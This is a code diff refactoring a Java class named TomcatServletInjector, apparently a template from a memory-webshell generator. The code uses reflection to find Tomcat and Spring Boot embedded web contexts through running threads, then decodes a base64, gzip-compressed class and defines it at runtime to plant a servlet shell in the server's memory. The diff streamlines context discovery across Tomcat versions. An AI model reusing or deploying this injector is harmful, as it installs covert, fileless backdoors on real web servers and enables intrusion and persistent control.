@@ -43,42 +43,22 @@ public class TomcatServletInjector {
         return "{{urlPattern}}";
     }
 
-    @SuppressWarnings("all")
     public List<Object> getContext() throws Exception {
         List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", null, null);
-        Object context = null;
+        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", new Class[0], new Object[0]);
         for (Thread thread : threads) {
-            // 适配 v5/v6/7/8
-            if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
-                HashMap childrenMap = (HashMap) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
-                // 原: map.get("localhost")
-                // 之前没有对 StandardHost 进行遍历，只考虑了 localhost 的情况，如果目标自定义了 host,则会获取不到对应的 context，导致注入失败
-                for (Object key : childrenMap.keySet()) {
-                    HashMap children = (HashMap) getFieldValue(childrenMap.get(key), "children");
-                    // 原: context = children.get("");
-                    // 之前没有对context map进行遍历，只考虑了 ROOT context 存在的情况，如果目标tomcat不存在 ROOT context，则会注入失败
-                    for (Object key1 : children.keySet()) {
-                        context = children.get(key1);
-                        if (context != null && context.getClass().getName().contains("StandardContext")) {
-                            contexts.add(context);
-                        }
-                        // 兼容 spring boot 2.x embedded tomcat
-                        if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
-                            contexts.add(context);
-                        }
+            if (thread.getName().contains("ContainerBackgroundProcessor")) {
+                HashMap<?, ?> childrenMap = (HashMap<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
+                for (Object value : childrenMap.values()) {
+                    HashMap<?, ?> children = (HashMap<?, ?>) getFieldValue(value, "children");
+                    for (Object context : children.values()) {
+                        contexts.add(context);
                     }
                 }
-            }
-            // 适配 tomcat v9
-            else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
-                context = getFieldValue(getFieldValue(thread.getContextClassLoader(), "resources"), "context");
-                if (context != null && context.getClass().getName().contains("StandardContext")) {
-                    contexts.add(context);
-                }
-                if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
-                    contexts.add(context);
-                }
+            } else if (thread.getContextClassLoader() != null
+                    && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader")
+                    || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
+                contexts.add(getFieldValue(getFieldValue(thread.getContextClassLoader(), "resources"), "context"));
             }
         }
         return contexts;
@@ -86,21 +66,19 @@ public class TomcatServletInjector {
 
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        Object obj;
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
         if (classLoader == null) {
             classLoader = context.getClass().getClassLoader();
         }
         try {
-            obj = classLoader.loadClass(getClassName()).newInstance();
+            return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            obj = clazz.newInstance();
+            return clazz.newInstance();
         }
-        return obj;
     }
 
     @SuppressWarnings("all")
@@ -203,7 +181,6 @@ public class TomcatServletInjector {
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         GZIPInputStream gzipInputStream = null;
-
         try {
             gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
             byte[] buffer = new byte[4096];
@@ -211,16 +188,13 @@ public class TomcatServletInjector {
             while ((n = gzipInputStream.read(buffer)) > 0) {
                 out.write(buffer, 0, n);
             }
+            return out.toByteArray();
         } finally {
             if (gzipInputStream != null) {
-                try {
-                    gzipInputStream.close();
-                } catch (IOException ignored) {
-                }
+                gzipInputStream.close();
             }
             out.close();
         }
-        return out.toByteArray();
     }
 
     @SuppressWarnings("all")
